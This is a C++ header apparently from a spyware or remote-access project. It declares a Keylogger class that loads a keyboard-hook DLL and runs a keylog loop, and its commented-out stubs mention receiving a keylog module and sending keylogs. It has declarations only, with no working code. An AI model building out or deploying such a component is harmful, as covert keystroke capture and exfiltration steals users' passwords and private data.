#pragma once
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include "core.h"

typedef VOID(*SetHook)();
typedef VOID(*RemoveHook)();

class Keylogger : public virtual Core
{
	HMODULE keylog_dll;
	static SetHook SetKeyBoardHook;
	RemoveHook RemoveKeyBoardHook;
	static void keylog_loop();
//	bool is_keylog_module_present(); 
//	void recieve_keylog_module(); 
//  send_keylogs();
public:
	Keylogger();
	~Keylogger();
};